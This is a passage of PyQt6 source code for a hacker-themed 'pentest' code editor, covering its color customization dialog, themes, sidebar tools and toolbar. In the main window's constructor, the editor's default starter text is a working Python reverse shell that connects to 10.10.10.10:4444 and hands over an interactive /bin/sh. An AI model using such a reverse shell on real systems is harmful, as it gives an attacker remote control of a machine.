            self.create_color_picker(frame_layout, f"{btn_name} - Text", f"btn_{btn_name.lower().replace(' ', '_')}_text", "#00ff41")
            self.create_color_picker(frame_layout, f"{btn_name} - Border", f"btn_{btn_name.lower().replace(' ', '_')}_border", "#00ff41")
            self.create_color_picker(frame_layout, f"{btn_name} - Hover", f"btn_{btn_name.lower().replace(' ', '_')}_hover", "#005500")
            
            container_layout.addWidget(frame)
            
        container_layout.addStretch()
        scroll.setWidget(container)
        buttons_layout.addWidget(scroll)
        
        self.tabs.addTab(buttons_tab, "INDIVIDUAL BUTTONS")
        
        layout.addWidget(self.tabs)
        
        # Action buttons
        action_layout = QHBoxLayout()
        
        preview_btn = QPushButton("PREVIEW CHANGES")
        preview_btn.setStyleSheet("""
            QPushButton {
                background: #0066ff;
                color: white;
                border: 2px solid #0044aa;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
            }
            QPushButton:hover {
                background: #0088ff;
            }
        """)
        preview_btn.clicked.connect(self.preview_changes)
        action_layout.addWidget(preview_btn)
        
        apply_btn = QPushButton("APPLY & SAVE")
        apply_btn.setStyleSheet("""
            QPushButton {
                background: #00aa44;
                color: white;
                border: 2px solid #008833;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
            }
            QPushButton:hover {
                background: #00cc66;
            }
        """)
        apply_btn.clicked.connect(self.apply_and_save)
        action_layout.addWidget(apply_btn)
        
        reset_btn = QPushButton("RESET TO DEFAULTS")
        reset_btn.setStyleSheet("""
            QPushButton {
                background: #ff6600;
                color: white;
                border: 2px solid #cc4400;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
            }
            QPushButton:hover {
                background: #ff8844;
            }
        """)
        reset_btn.clicked.connect(self.reset_to_defaults)
        action_layout.addWidget(reset_btn)
        
        close_btn = QPushButton("CLOSE")
        close_btn.setStyleSheet("""
            QPushButton {
                background: #aa0000;
                color: white;
                border: 2px solid #880000;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
            }
            QPushButton:hover {
                background: #cc2222;
            }
        """)
        close_btn.clicked.connect(self.close)
        action_layout.addWidget(close_btn)
        
        layout.addLayout(action_layout)
        
        self.setLayout(layout)
        
    def create_color_picker(self, layout, label_text, color_key, default_color):
        """Helper to create a color picker row - FIXED"""
        # Get current color from parent window if it exists
        current_color = default_color
        if self.parent_window and hasattr(self.parent_window, 'custom_colors'):
            current_color = self.parent_window.custom_colors.get(color_key, default_color)
        frame = QFrame()
        frame.setFrameStyle(QFrame.Shape.Box)
        frame.setStyleSheet("background: #001133; border: 1px solid #004466; padding: 5px; border-radius: 4px;")
        frame_layout = QHBoxLayout(frame)
        
        label = QLabel(label_text)
        label.setFont(QFont("Consolas", 10))
        label.setStyleSheet("color: #aaffff; min-width: 250px;")
        frame_layout.addWidget(label)
        
        # Color preview
        preview = QLabel()
        preview.setFixedSize(30, 30)
        preview.setStyleSheet(f"background: {default_color}; border: 1px solid #ffffff;")
        frame_layout.addWidget(preview)
        
        # Color hex input
        hex_input = QLineEdit(default_color)
        hex_input.setFixedWidth(100)
        hex_input.setFont(QFont("Consolas", 10))
        hex_input.setStyleSheet("background: #002244; color: #ffffff; border: 1px solid #00aaff;")
        frame_layout.addWidget(hex_input)
        
        # Color picker button
        picker_btn = QPushButton("Pick")
        picker_btn.setFixedWidth(60)
        picker_btn.setStyleSheet("""
            QPushButton {
                background: #004466;
                color: #aaffff;
                border: 1px solid #00aaff;
                padding: 4px;
                border-radius: 3px;
            }
            QPushButton:hover {
                background: #006688;
            }
        """)
        
        # Connect signals
        picker_btn.clicked.connect(lambda: self.pick_color(hex_input, preview))
        hex_input.textChanged.connect(lambda text: self.update_preview(text, preview))
        
        frame_layout.addWidget(picker_btn)
        frame_layout.addStretch()
        
        layout.addWidget(frame)
        
        # Store references
        if not hasattr(self, 'color_widgets'):
            self.color_widgets = {}
        self.color_widgets[color_key] = {
            'input': hex_input,
            'preview': preview,
            'default': default_color
        }
        
    def pick_color(self, hex_input, preview):
        """Open color picker dialog with current color"""
        # Get current color from the input field
        current_color_text = hex_input.text()
        current_color = QColor(current_color_text) if QColor.isValidColor(current_color_text) else QColor("#000000")
    
        color = QColorDialog.getColor(current_color)
        if color.isValid():
            hex_color = color.name()
            hex_input.setText(hex_color)
            preview.setStyleSheet(f"background: {hex_color}; border: 1px solid #ffffff;")
            
    def update_preview(self, text, preview):
        """Update color preview when hex changes"""
        if QColor.isValidColor(text):
            preview.setStyleSheet(f"background: {text}; border: 1px solid #ffffff;")
            
    def preview_changes(self):
        """Preview changes without saving"""
        if self.parent_window:
            # Collect all colors
            colors = {}
            for key, widgets in self.color_widgets.items():
                colors[key] = widgets['input'].text()
            
            # Apply preview to parent
            self.parent_window.preview_custom_colors(colors)
            
    def apply_and_save(self):
        """Apply and save customization"""
        if self.parent_window:
            # Collect all colors
            colors = {}
            for key, widgets in self.color_widgets.items():
                colors[key] = widgets['input'].text()
            
            # Apply to parent
            self.parent_window.apply_custom_colors(colors)
            
            # Save to file
            self.parent_window.save_custom_colors(colors)
            
            QMessageBox.information(self, "CUSTOMIZATION SAVED", 
                                  "Custom colors have been applied and saved!\n"
                                  "They will persist when you restart the application.")
            
    def reset_to_defaults(self):
        """Reset all colors to defaults"""
        reply = QMessageBox.question(self, "RESET CONFIRMATION",
                                   "Are you sure you want to reset ALL colors to defaults?",
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            for key, widgets in self.color_widgets.items():
                widgets['input'].setText(widgets['default'])
            
            # Reset parent window if open
            if self.parent_window:
                self.parent_window.reset_to_theme()

# ==================== MAIN WINDOW ====================
class LeviathanEditUltimate(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("LEVIATHAN EDIT v3.0 - ULTIMATE CLASSIFIED PENTEST EDITOR")
        self.setGeometry(100, 100, 1600, 1000)
        
        # Initialize themes
        self.init_themes()
        self.current_theme = "FBI Terminal"

        # Initialize custom_colors with complete theme, THEN load customizations
        self.custom_colors = self.themes[self.current_theme].copy()

        # Load custom colors (this should only override specific keys)
        loaded_colors = self.load_custom_colors()
        if loaded_colors:
            # Merge loaded colors with theme defaults
            for key, value in loaded_colors.items():
                self.custom_colors[key] = value
        
        # Initialize language settings
        self.current_language = "Python"
        self.lexer = get_lexer_by_name("python")
        
        # Font size
        self.base_font_size = 14
        self.current_font_size = 14
        
        # Background image
        self.background_image_path = None
        self.current_transparency = 1.0
        self.background_mode = "cover"

        # Custom templates
        self.custom_templates = self.load_custom_templates()
        
        # Process management
        self.process_worker = None
        self.process_thread = None
        self.stop_button = None
        
        # Create UI
        self.create_ui()
        
        # Load initial content into first tab
        current_tab = self.tabs.currentWidget()
        if hasattr(current_tab, 'editor'):
            current_tab.editor.setPlainText("""# TOP SECRET // NOFORN // EYES ONLY
# LEVIATHAN EDIT v3.0 - PYQT6 ULTIMATE EDITION

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

# TYPE HERE - BACKGROUND IS BEHIND TEXT, NOT IN TEXT
# This is the superior PyQt6 implementation""")
        
        # Apply initial theme
        self.apply_theme()
                       
        # AUTOCOMPLETE POPUP (JEDI)
        self.autocomplete_popup = QListWidget()
        self.autocomplete_popup.setWindowFlags(
            Qt.WindowType.ToolTip | Qt.WindowType.FramelessWindowHint
        )
        self.autocomplete_popup.setFocusPolicy(Qt.FocusPolicy.NoFocus)

        # Make it transparent and styled
        self.autocomplete_popup.setWindowOpacity(0.9)  # Adjust 0.0-1.0 for transparency
        self.autocomplete_popup.setStyleSheet("""
            QListWidget {
                background: transparent;
                color: #00ffaa;
                border: 2px solid #00ff41;
                border-radius: 6px;
                padding: 5px;
                font-family: Consolas;
                font-size: 12pt;
            }
            QListWidget::item {
                padding: 5px;
                border-radius: 3px;
            }
            QListWidget::item:selected {
                background-color: rgba(0, 255, 65, 50);  /* Semi-transparent green */
                color: #00ff41;
                font-weight: bold;
            }
            QListWidget::item:hover {
                background-color: rgba(0, 255, 170, 30);
            }
        """)

        self.autocomplete_popup.hide()

    def send_input_to_process(self):
        """Send input from the input line to the running process"""
        if not hasattr(self, 'process_worker') or self.process_worker is None:
            self.output_console.appendPlainText("\n✗ ERROR: No process is running")
            return
        
        if hasattr(self.process_worker, 'process') and self.process_worker.process:
            if self.process_worker.process.poll() is not None:
                self.output_console.appendPlainText("\n✗ ERROR: Process has already finished")
                self.cleanup_after_process()
                return
        
        text = self.input_line.text()
        if not text.strip():
            return
        
        self.input_line.clear()
        
        # Echo the input to output console with prefix
        self.output_console.appendPlainText(f"[USER INPUT]: {text}")
        
        # Send to the process worker
        success = self.process_worker.send_input(text)
        if not success:
            self.output_console.appendPlainText("✗ ERROR: Failed to send input to process")
            self.cleanup_after_process()

    
    def clear_console_now(self):
        """Manual console clear button"""
        self.output_console.clear()
        self.status_bar.showMessage("CONSOLE CLEARED")

    def show_input_prompt(self, prompt=""):
        """Show the input console with a prompt"""
        self.input_frame.show()
        if prompt:
            self.input_line.setPlaceholderText(prompt)
            self.input_line.setFocus()

    def hide_input_prompt(self):
        """Hide the input console"""
        self.input_frame.hide()
        
    def resizeEvent(self, event):
        """Reapply background when window is resized"""
        super().resizeEvent(event)
        if self.background_image_path:
            # Small delay to avoid too many redraws during resize
            QTimer.singleShot(100, self.apply_background_style)

    def find_python(self):
        """
        Return a usable system Python interpreter path.
        - When running from source: prefer the running python (python on PATH).
        - When frozen as a PyInstaller EXE: try to *locate* a real python executable
          (python, python3, or py on Windows) via shutil.which().
        Returns the path string or None if not found.
        """
        import shutil

        # If not frozen, just use the current interpreter (should be fine for dev)
        if not getattr(sys, 'frozen', False):
            # use explicit 'python' or 'python3' on PATH
            for name in ("python", "python3"):
                p = shutil.which(name)
                if p:
                    return p
            # fallback to sys.executable
            return sys.executable

        # If frozen (EXE), we must find a system python (can't use sys.executable)
        # Try common names
        for name in (
            "python", "python3", "python3.11", "python3.10", "python3.9",
            "py",              # Windows
            "/usr/bin/python3",
            "/usr/local/bin/python3",
            "/opt/homebrew/bin/python3",   # macOS with Homebrew (Apple Silicon)
            "/usr/bin/python"
        ):
            p = shutil.which(name)
            if p:
                return p

        # Not found — return None so caller can inform user
        return None

    def init_themes(self):
        """Initialize the 10 epic themes with COMPLETE color sets for customization"""
        # Base colors for FBI Terminal (your default)
        self.themes = {
            "FBI Terminal": {
                # Window/global
                "bg": "#000000",
                "panel": "#0d0d0d",
                "text": "#00ff41",
                "accent": "#00ff41",
                "select": "#003300",
                "cursor": "#00ff41",
            
                # Sidebar
                "sidebar_bg": "#111122",
                "sidebar_title": "#00ff41",
                "sidebar_version": "#ff0066",
                "sidebar_labels": "#00ffaa",
                "sidebar_btn_bg": "#002200",
                "sidebar_btn_text": "#00ff41",
                "sidebar_btn_border": "#00ff41",
                "sidebar_combo": "#001122",
            
                # Editor
                "editor_bg": "transparent",
                "editor_text": "#00ff41",
                "editor_selection": "#003300",
            
                # Line numbers
                "line_bg": "#001100",
                "line_text": "#00ff41",
            
                # Syntax highlighting
                "syntax_keywords": "#ff6b6b",
                "syntax_strings": "#98c379",
                "syntax_comments": "#5c6370",
                "syntax_functions": "#61afef",
                "syntax_numbers": "#d19a66",
            
                # Toolbar & Console
                "toolbar_bg": "#111122",
                "toolbar_btn_bg": "#003300",
                "toolbar_btn_text": "#00ff41",
                "console_bg": "transparent",
                "console_text": "#ff4444",
                "console_error": "#ff0000",
                "console_border": "#ff4444",
            
                # Status Bar
                "status_bg": "#330000",
                "status_text": "#ff0066",
                "status_border": "#ff0066",
            
                # Individual buttons (all set to defaults initially)
                "btn_new_tab_bg": "#003300",
                "btn_new_tab_text": "#00ff41",
                "btn_new_tab_border": "#00ff41",
                "btn_new_tab_hover": "#005500",
            
                "btn_open_file_bg": "#003300",
                "btn_open_file_text": "#00ff41",
                "btn_open_file_border": "#00ff41",
                "btn_open_file_hover": "#005500",
            
                "btn_save_file_bg": "#003300",
                "btn_save_file_text": "#00ff41",
                "btn_save_file_border": "#00ff41",
                "btn_save_file_hover": "#005500",
            
                "btn_run_bg": "#003300",
                "btn_run_text": "#00ff41",
                "btn_run_border": "#00ff41",
                "btn_run_hover": "#005500",
            
                "btn_explorer_bg": "#003300",
                "btn_explorer_text": "#00ff41",
                "btn_explorer_border": "#00ff41",
                "btn_explorer_hover": "#005500",
            
                "btn_sidebar_toggle_bg": "#003300",
                "btn_sidebar_toggle_text": "#00ff41",
                "btn_sidebar_toggle_border": "#00ff41",
                "btn_sidebar_toggle_hover": "#005500",
            
                "btn_customize_bg": "#003300",
                "btn_customize_text": "#00ff41",
                "btn_customize_border": "#00ff41",
                "btn_customize_hover": "#005500",
            
                "btn_base64_tool_bg": "#002200",
                "btn_base64_tool_text": "#00ff41",
                "btn_base64_tool_border": "#00ff41",
                "btn_base64_tool_hover": "#005500",
            
                "btn_url_tool_bg": "#002200",
                "btn_url_tool_text": "#00ff41",
                "btn_url_tool_border": "#00ff41",
                "btn_url_tool_hover": "#005500",
            
                "btn_hash_tool_bg": "#002200",
                "btn_hash_tool_text": "#00ff41",
                "btn_hash_tool_border": "#00ff41",
                "btn_hash_tool_hover": "#005500",
            
                "btn_templates_bg": "#002200",
                "btn_templates_text": "#00ff41",
                "btn_templates_border": "#00ff41",
                "btn_templates_hover": "#005500"
            }
        }
    
        # Create other themes by copying FBI Terminal and modifying key colors
        # CIA BlackOps
        self.themes["CIA BlackOps"] = self.themes["FBI Terminal"].copy()
        self.themes["CIA BlackOps"].update({
            "bg": "#001122", "panel": "#001833", "text": "#00ffff", "accent": "#00ffff",
            "sidebar_bg": "#001833", "sidebar_title": "#00ffff", "sidebar_btn_bg": "#003366"
        })
    
        # NSA Quantum
        self.themes["NSA Quantum"] = self.themes["FBI Terminal"].copy()
        self.themes["NSA Quantum"].update({
            "bg": "#0a001f", "panel": "#1a0033", "text": "#ff00ff", "accent": "#ff00ff",
            "sidebar_bg": "#1a0033", "sidebar_title": "#ff00ff", "sidebar_btn_bg": "#330066"
        })
    
        # Matrix Rain
        self.themes["Matrix Rain"] = self.themes["FBI Terminal"].copy()
        self.themes["Matrix Rain"].update({
            "bg": "#000000", "panel": "#001100", "text": "#00ff00", "accent": "#00ff00",
            "sidebar_bg": "#001100", "sidebar_title": "#00ff00", "sidebar_btn_bg": "#002200"
        })
    
        # Blood Agent
        self.themes["Blood Agent"] = self.themes["FBI Terminal"].copy()
        self.themes["Blood Agent"].update({
            "bg": "#110000", "panel": "#220000", "text": "#ff3333", "accent": "#ff0000",
            "sidebar_bg": "#220000", "sidebar_title": "#ff3333", "sidebar_btn_bg": "#330000"
        })
    
        # Ghost Protocol
        self.themes["Ghost Protocol"] = self.themes["FBI Terminal"].copy()
        self.themes["Ghost Protocol"].update({
            "bg": "#0a0a1f", "panel": "#141428", "text": "#8888ff", "accent": "#4444ff",
            "sidebar_bg": "#141428", "sidebar_title": "#8888ff", "sidebar_btn_bg": "#222244"
        })
    
        # Zero Day
        self.themes["Zero Day"] = self.themes["FBI Terminal"].copy()
        self.themes["Zero Day"].update({
            "bg": "#001100", "panel": "#002200", "text": "#00ffaa", "accent": "#00ffaa",
            "sidebar_bg": "#002200", "sidebar_title": "#00ffaa", "sidebar_btn_bg": "#003322"
        })
    
        # Deep Web
        self.themes["Deep Web"] = self.themes["FBI Terminal"].copy()
        self.themes["Deep Web"].update({
            "bg": "#000011", "panel": "#000022", "text": "#44ff44", "accent": "#00ff00",
            "sidebar_bg": "#000022", "sidebar_title": "#44ff44", "sidebar_btn_bg": "#002200"
        })
    
        # Quantum Hack
        self.themes["Quantum Hack"] = self.themes["FBI Terminal"].copy()
        self.themes["Quantum Hack"].update({
            "bg": "#000033", "panel": "#000066", "text": "#00ccff", "accent": "#0088ff",
            "sidebar_bg": "#000066", "sidebar_title": "#00ccff", "sidebar_btn_bg": "#002244"
        })
    
        # Black Ice
        self.themes["Black Ice"] = self.themes["FBI Terminal"].copy()
        self.themes["Black Ice"].update({
            "bg": "#0f0f1f", "panel": "#1f1f3f", "text": "#88aaff", "accent": "#5588ff",
            "sidebar_bg": "#1f1f3f", "sidebar_title": "#88aaff", "sidebar_btn_bg": "#223355"
        })

    def load_custom_templates(self):
        """Load custom templates from templates folder"""
        templates = {}
        templates_dir = os.path.join(os.path.dirname(__file__), "templates")
        
        if not os.path.exists(templates_dir):
            os.makedirs(templates_dir)
        
        if os.path.exists(templates_dir):
            for filename in os.listdir(templates_dir):
                if filename.endswith(('.txt', '.py', '.sh', '.js', '.html', '.css', '.java', '.c', '.cpp', '.go', '.rs', '.php', '.rb', '.sql')):
                    filepath = os.path.join(templates_dir, filename)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            template_name = os.path.splitext(filename)[0].upper().replace('_', ' ')
                            templates[template_name] = f.read()
                    except:
                        pass
        
        return templates

    def create_ui(self):
        # === CENTRAL WIDGET ===
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        clear_shortcut = QKeySequence("Ctrl+L")
        clear_action = QAction("Clear Console", self)
        clear_action.setShortcut(clear_shortcut)
        clear_action.triggered.connect(self.clear_console_now)
        self.addAction(clear_action)

        #################################################################
        #  SCROLLABLE SIDEBAR  (fixes disappearing buttons)
        #################################################################
        sidebar_scroll = QScrollArea()
        sidebar_scroll.setWidgetResizable(True)
        sidebar_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        sidebar_scroll.setStyleSheet("QScrollArea { border: none; }")

        sidebar_container = QWidget()
        sidebar_scroll.setWidget(sidebar_container)

        sidebar = QFrame(sidebar_container)
        sidebar.setMinimumWidth(350)
        sidebar.setMaximumWidth(350)
        sidebar.setStyleSheet("""
            QFrame {
                background-color: #111122;
                border-right: 2px solid #00ff41;
            }
        """)

        sidebar_layout = QVBoxLayout(sidebar)
        sidebar_layout.setContentsMargins(15, 15, 15, 15)
        sidebar_layout.setSpacing(10)

        outer_sidebar_layout = QVBoxLayout(sidebar_container)
        outer_sidebar_layout.addWidget(sidebar)

        # TITLE
        title = QLabel("LEVIATHAN\nEDIT v3.0")
        title.setFont(QFont("Orbitron", 28, QFont.Weight.Bold))
        title.setStyleSheet("color: #00ff41; background: transparent;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sidebar_layout.addWidget(title)

        version = QLabel("ULTIMATE PYQT6 EDITION")
        version.setFont(QFont("Consolas", 10))
        version.setStyleSheet("color: #ff0066; background: transparent;")
        version.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sidebar_layout.addWidget(version)

        sidebar_layout.addSpacing(20)

        tools_label = QLabel("CLASSIFIED TOOLS")
        tools_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        tools_label.setStyleSheet("color: #00ffaa; background: transparent;")
        sidebar_layout.addWidget(tools_label)

        # Your sidebar tool buttons
        tools = [
            ("BASE64 ENCODER/DECODER", self.open_base64_tool, "btn_base64_tool"),
            ("URL ENCODE/DECODE", self.open_url_tool, "btn_url_tool"),
            ("HASH IDENTIFIER", self.open_hash_tool, "btn_hash_tool"),
            ("PAYLOAD TEMPLATES", self.open_templates_tool, "btn_templates")
        ]

        for name, cmd, obj_name in tools:
            btn = QPushButton(name)
            btn.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            btn.setObjectName(obj_name)  # Changed to use specific name
            btn.setStyleSheet("""
                QPushButton {
                    background: #002200;
                    color: #00ff41;
                    border: 2px solid #00ff41;
                    border-radius: 8px;
                    padding: 12px;
                    margin: 5px;
                }
                QPushButton:hover {
                    background: #005500;
                    border: 2px solid #00ff88;
                }   
            """)
            btn.clicked.connect(cmd)
            sidebar_layout.addWidget(btn)

        # Theme Selector
        sidebar_layout.addSpacing(30)
        theme_label = QLabel("CLASSIFIED THEMES")
        theme_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        theme_label.setStyleSheet("color: #ff0066; background: transparent;")
        sidebar_layout.addWidget(theme_label)
        
        self.theme_combo = QComboBox()
        self.theme_combo.addItems(list(self.themes.keys()))
        self.theme_combo.setCurrentText(self.current_theme)
        self.theme_combo.setFont(QFont("Consolas", 10))
        self.theme_combo.setObjectName("sidebar_combo")  # KEEP THIS
        self.theme_combo.setStyleSheet("""
            QComboBox {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                border-radius: 4px;
                padding: 8px;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox::down-arrow {
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 5px solid #00ff41;
            }
        """)
        self.theme_combo.currentTextChanged.connect(self.load_theme)
        sidebar_layout.addWidget(self.theme_combo)

        # Display Settings
        sidebar_layout.addSpacing(30)
        display_label = QLabel("DISPLAY SETTINGS")
        display_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        display_label.setStyleSheet("color: #00aaff; background: transparent;")
        sidebar_layout.addWidget(display_label)
        
        # Font size control
        font_frame = QFrame()
        font_layout = QHBoxLayout(font_frame)
        font_layout.setContentsMargins(0, 0, 0, 0)
        
        decrease_font_btn = QPushButton("A-")
        decrease_font_btn.setFixedSize(50, 30)
        decrease_font_btn.clicked.connect(self.decrease_font)
        decrease_font_btn.setStyleSheet("""
            QPushButton {
                background: #330033;
                color: #ff00ff;
                border: 1px solid #ff00ff;
                border-radius: 4px;
                font-weight: bold;
            }
        """)
        
        font_label = QLabel("FONT SIZE")
        font_label.setStyleSheet("color: #00ffaa;")
        font_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        increase_font_btn = QPushButton("A+")
        increase_font_btn.setFixedSize(50, 30)
        increase_font_btn.clicked.connect(self.increase_font)
        increase_font_btn.setStyleSheet("""
            QPushButton {
                background: #330033;
                color: #ff00ff;
                border: 1px solid #ff00ff;
                border-radius: 4px;
                font-weight: bold;
            }
        """)
        
        font_layout.addWidget(decrease_font_btn)
        font_layout.addWidget(font_label)
        font_layout.addWidget(increase_font_btn)
        sidebar_layout.addWidget(font_frame)

        # Transparency control
        transparency_label = QLabel("TRANSPARENCY")
        transparency_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        transparency_label.setStyleSheet("color: #ff00ff; background: transparent;")
        sidebar_layout.addWidget(transparency_label)
        
        self.transparency_slider = QSlider(Qt.Orientation.Horizontal)
        self.transparency_slider.setRange(30, 100)
        self.transparency_slider.setValue(100)
        self.transparency_slider.setStyleSheet("""
            QSlider::groove:horizontal {
                border: 1px solid #ff00ff;
                height: 8px;
                background: #330033;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #ff00ff;
                border: 1px solid #ff00ff;
                width: 18px;
                margin: -5px 0;
                border-radius: 9px;
            }
        """)
        self.transparency_slider.valueChanged.connect(self.change_transparency)
        sidebar_layout.addWidget(self.transparency_slider)

        # Background Image
        background_label = QLabel("BACKGROUND IMAGE")
        background_label.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        background_label.setStyleSheet("color: #00ff88; background: transparent;")
        sidebar_layout.addWidget(background_label)
        
        bg_frame = QFrame()
        bg_layout = QHBoxLayout(bg_frame)
        bg_layout.setContentsMargins(0, 0, 0, 0)
        
        set_bg_btn = QPushButton("SET IMAGE")
        set_bg_btn.clicked.connect(self.set_background_image)
        set_bg_btn.setStyleSheet("""
            QPushButton {
                background: #003333;
                color: #00ffaa;
                border: 1px solid #00ffaa;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
        """)
        
        clear_bg_btn = QPushButton("CLEAR")
        clear_bg_btn.clicked.connect(self.clear_background_image)
        clear_bg_btn.setStyleSheet("""
            QPushButton {
                background: #333300;
                color: #ffaa00;
                border: 1px solid #ffaa00;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
        """)
        
        bg_layout.addWidget(set_bg_btn)
        bg_layout.addWidget(clear_bg_btn)
        sidebar_layout.addWidget(bg_frame)

        # Background Mode Selector
        bg_mode_label = QLabel("IMAGE MODE")
        bg_mode_label.setFont(QFont("Consolas", 10, QFont.Weight.Bold))
        bg_mode_label.setStyleSheet("color: #00ff88; background: transparent;")
        sidebar_layout.addWidget(bg_mode_label)

        self.bg_mode_combo = QComboBox()
        self.bg_mode_combo.addItems(["Cover", "Contain", "Stretch", "Center", "Tile"])
        self.bg_mode_combo.setCurrentText("Cover")
        self.bg_mode_combo.setFont(QFont("Consolas", 9))
        self.bg_mode_combo.setStyleSheet("""
                QComboBox {
                    background: #003333;
                    color: #00ffaa;
                    border: 1px solid #00ffaa;
                    border-radius: 4px;
                    padding: 6px;
                }
        """)
        self.bg_mode_combo.currentTextChanged.connect(self.change_background_mode)
        sidebar_layout.addWidget(self.bg_mode_combo)

        sidebar_layout.addStretch()

        # Add sidebar to main layout
        main_layout.addWidget(sidebar_scroll)

        #################################################################
        #  EDITOR AREA WITH TOP TABS (VS Code Style)
        #################################################################
        editor_area = QWidget()
        editor_layout = QVBoxLayout(editor_area)
        editor_layout.setContentsMargins(0, 0, 0, 0)
        editor_layout.setSpacing(0)

        # Toolbar
        toolbar = QToolBar()
        toolbar.setStyleSheet("QToolBar { background: #111122; padding: 5px; }")

        # Toolbar buttons
        new_action = QAction("NEW TAB", self)
        new_action.triggered.connect(self.new_file)
        new_action.setObjectName("btn_new_tab")  # ADD THIS
        toolbar.addAction(new_action)

        open_action = QAction("OPEN FILE", self)
        open_action.triggered.connect(self.open_file)
        open_action.setObjectName("btn_open_file")  # ADD THIS
        toolbar.addAction(open_action)

        save_action = QAction("SAVE FILE", self)
        save_action.triggered.connect(self.save_file)
        save_action.setObjectName("btn_save_file")  # ADD THIS
        toolbar.addAction(save_action)

        # === RUN CODE BUTTON ===
        self.run_action = QAction("▶ RUN", self)
        self.run_action.triggered.connect(self.toggle_run_stop)
        self.run_action.setObjectName("btn_run")  # ADD THIS
        toolbar.addAction(self.run_action)

        toggle_fb_action = QAction("EXPLORER", self)
        toggle_fb_action.triggered.connect(self.toggle_file_browser)
        toggle_fb_action.setObjectName("btn_explorer")  # ADD THIS
        toolbar.addAction(toggle_fb_action)

        # Add sidebar toggle button
        self.sidebar_toggle_action = QAction("SIDEBAR", self)
        self.sidebar_toggle_action.setCheckable(True)
        self.sidebar_toggle_action.setChecked(True)
        self.sidebar_toggle_action.triggered.connect(self.toggle_sidebar)
        self.sidebar_toggle_action.setObjectName("btn_sidebar_toggle")  # ADD THIS
        toolbar.addAction(self.sidebar_toggle_action)

        # Add customization button
        customize_action = QAction("CUSTOMIZE", self)
        customize_action.triggered.connect(self.open_customization_window)
        customize_action.setObjectName("btn_customize")  # ADD THIS
        toolbar.addAction(customize_action)

        toolbar.addSeparator()
        
        lang_label = QLabel("  LANG:")
        lang_label.setStyleSheet("color: #00ff41;")
        toolbar.addWidget(lang_label)
        
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["Python", "JavaScript", "HTML", "CSS", "Bash", "C", "C++", 
                                  "Java", "Go", "Rust", "PHP", "Ruby", "SQL"])
        self.lang_combo.setCurrentText("Python")
        self.lang_combo.setFixedWidth(120)
        self.lang_combo.setStyleSheet("""
            QComboBox {
                background: #003300;
                color: #00ff41;
                border: 1px solid #00ff41;
                border-radius: 4px;
                padding: 4px;
            }
        """)
        self.lang_combo.currentTextChanged.connect(self.change_language)
        toolbar.addWidget(self.lang_combo)

        editor_layout.addWidget(toolbar)

        # === TAB WIDGET ===
        self.tabs = QTabWidget()
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.close_tab)
        self.tabs.setDocumentMode(True)
        editor_layout.addWidget(self.tabs)

        # Create the first tab automatically
        self.create_new_tab(initial_text=True)

        # Status Bar
        self.status_bar = QStatusBar()
        self.status_bar.setStyleSheet("""
            QStatusBar {
                background: #330000;
                color: #ff0066;
                font-weight: bold;
                border-top: 2px solid #ff0066;
            }
        """)
        self.status_bar.showMessage("STATUS: ACTIVE // LEVIATHAN EDIT v3.0 // THEME: FBI Terminal")
        # === OUTPUT CONSOLE ===
        self.output_console = QPlainTextEdit()
        self.output_console.setReadOnly(True)
        self.output_console.setFixedHeight(200)
        self.output_console.setObjectName("output_console")  # KEEP THIS
        self.output_console.setStyleSheet("""
            QPlainTextEdit {
                background: transparent;
                color: #ff4444;
                border-top: 2px solid #ff4444;
                font-family: Consolas;
                font-size: 12pt;
            }
            """)
        self.output_console.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, True)
        self.output_console.viewport().setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, True)
        editor_layout.addWidget(self.output_console)
        editor_layout.addWidget(self.status_bar)

        # Add editor area
        main_layout.addWidget(editor_area, 1)

        # === FILE BROWSER ===
        self.file_browser = FB.FileExplorer()
        self.file_browser.file_selected.connect(self.open_file_from_browser)
        main_layout.addWidget(self.file_browser)
        
        # === INPUT CONSOLE (for interactive programs) ===
        self.input_frame = QFrame()
        input_layout = QHBoxLayout(self.input_frame)
        input_layout.setContentsMargins(5, 5, 5, 5)

        input_label = QLabel("INPUT:")
        input_label.setStyleSheet("color: #00ffaa; font-weight: bold; font-size: 12px;")
        input_layout.addWidget(input_label)

        self.input_line = QLineEdit()
        self.input_line.setStyleSheet("""
            QLineEdit {
                background: #002200;
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 8px;
                font-family: Consolas;
                font-size: 12pt;
            }
        """)
        self.input_line.returnPressed.connect(self.send_input_to_process)
